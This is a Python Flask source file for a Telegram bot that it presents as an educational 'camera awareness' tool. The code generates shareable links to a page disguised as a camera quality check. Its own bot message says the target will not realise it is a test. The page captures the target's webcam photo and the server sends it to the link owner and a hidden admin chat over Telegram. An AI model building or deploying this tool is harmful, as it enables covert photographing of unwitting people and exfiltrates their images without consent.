
"""
Camera Awareness Bot - بوت قياس الوعي الأمني
مشروع تعليمي مفتوح المصدر - متوافق مع Vercel
"""

import os
import base64
import requests
import json
from io import BytesIO
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# استيراد الإعدادات من متغيرات البيئة
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "")
WEB_DOMAIN = os.environ.get("WEB_DOMAIN", "").rstrip('/')
WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", "my_secret_token")

BASE_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def encode_data(chat_id):
    """تشفير معرف الدردشة في الرابط ليكون Stateless"""
    data = json.dumps({"c": chat_id}).encode('utf-8')
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

def decode_data(encoded_str):
    """فك تشفير معرف الدردشة من الرابط"""
    try:
        # إضافة الحشوة المفقودة
        padding = '=' * (4 - len(encoded_str) % 4)
        data = base64.urlsafe_b64decode(encoded_str + padding).decode('utf-8')
        return json.loads(data).get("c")
    except:
        return None

def send_telegram_photo(chat_id, photo_bytes, caption=""):
    """إرسال صورة لمحادثة تليجرام"""
    url = f"{BASE_URL}/sendPhoto"
    files = {"photo": ("capture.jpg", photo_bytes, "image/jpeg")}
    data = {"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"}
    try:
        response = requests.post(url, files=files, data=data, timeout=30)
        return response.json()
    except Exception as e:
        print(f"Error sending photo: {e}")
        return None

def send_telegram_message(chat_id, text):
    """إرسال رسالة نصية"""
    url = f"{BASE_URL}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    try:
        response = requests.post(url, json=data, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Error sending message: {e}")
        return None

@app.route("/")
def home():
    """الصفحة الرئيسية"""
    return "<h1>Camera Awareness Bot is Running</h1><p>استخدم البوت في تليجرام للحصول على رابط.</p>"

@app.route("/capture/<token>")
def capture_page(token):
    """صفحة التقاط الكاميرا"""
    chat_id = decode_data(token)
    if not chat_id:
        return "<h1>رابط غير صالح أو منتهي</h1>", 404
    return render_template("index.html", link_id=token)

@app.route("/upload/<token>", methods=["POST"])
def upload_photo(token):
    """استقبال الصورة من المتصفح"""
    owner_chat_id = decode_data(token)
    if not owner_chat_id:
        return jsonify({"status": "error", "message": "رابط غير صالح"}), 404

    try:
        data = request.json
        image_data = data.get("image", "")

        if not image_data:
            return jsonify({"status": "error", "message": "لا توجد صورة"}), 400

        # فك تشفير Base64
        image_data = image_data.replace("data:image/jpeg;base64,", "")
        image_bytes = base64.b64decode(image_data)

        # إرسال الصورة لصاحب الرابط
        caption_owner = "📸 <b>تم التقاط صورة!</b>\n\n" \
                        "✅ المستخدم وافق على إذن الكاميرا\n" \
                        "⚠️ هذا يعني أنه قد يكون عرضة لهجمات التصيد"
        
        send_telegram_photo(owner_chat_id, BytesIO(image_bytes), caption_owner)

        # إرسال نسخة للأدمن (إذا كان مختلفاً عن صاحب الرابط)
        if str(owner_chat_id) != str(ADMIN_CHAT_ID):
            caption_admin = f"📸 <b>تقرير وعي أمني</b>\n\n" \
                            f"👤 صاحب الرابط: <code>{owner_chat_id}</code>\n" \
                            f"📊 النتيجة: وافق على إذن الكاميرا"
            send_telegram_photo(ADMIN_CHAT_ID, BytesIO(image_bytes), caption_admin)

        return jsonify({"status": "success", "message": "تم إرسال الصورة"})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/decline/<token>", methods=["POST"])
def decline_capture(token):
    """المستخدم رفض إعطاء إذن الكاميرا"""
    owner_chat_id = decode_data(token)
    if not owner_chat_id:
        return jsonify({"status": "error", "message": "رابط غير صالح"}), 404

    # إبلاغ صاحب الرابط
    send_telegram_message(owner_chat_id, 
        "🛡️ <b>مستخدم واعٍ أمنياً!</b>\n\n" \
        "❌ المستخدم رفض إعطاء إذن الكاميرا\n" \
        "✅ هذا يعني وعياً أمنياً جيداً")

    # إبلاغ الأدمن
    if str(owner_chat_id) != str(ADMIN_CHAT_ID):
        send_telegram_message(ADMIN_CHAT_ID, 
            f"🛡️ <b>تقرير وعي أمني - رفض</b>\n\n" \
            f"👤 صاحب الرابط: <code>{owner_chat_id}</code>\n" \
            f"📊 النتيجة: رفض إذن الكاميرا")

    return jsonify({"status": "success", "message": "تم التسجيل"})

# Webhook endpoint
@app.route(f"/webhook/{WEBHOOK_SECRET}", methods=["POST"])
def webhook():
    # التحقق من سر الويب هوك للأمان
    if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != WEBHOOK_SECRET:
        return "Unauthorized", 403
    
    update = request.get_json()
    if not update or "message" not in update:
        return "", 200

    message = update["message"]
    chat_id = message["chat"]["id"]
    text = message.get("text", "")

    if text == "/start":
        token = encode_data(chat_id)
        capture_url = f"{WEB_DOMAIN}/capture/{token}"
        send_telegram_message(chat_id,
            f"✅ <b>تم إنشاء رابط الفحص بنجاح!</b>\n\n" \
            f"🔗 <code>{capture_url}</code>\n\n" \
            f"📤 شارك هذا الرابط مع من تريد اختباره.\n" \
            f"سيظهر له كصفحة 'فحص جودة الكاميرا' ولن يشعر بأنه اختبار أمني.")
    elif text == "/help":
        send_telegram_message(chat_id,
            "<b>📖 أوامر البوت:</b>\n\n" \
            "/start - توليد رابط جديد\n" \
            "/help - عرض هذه الرسالة")
            
    return "", 200

if __name__ == "__main__":
    pass
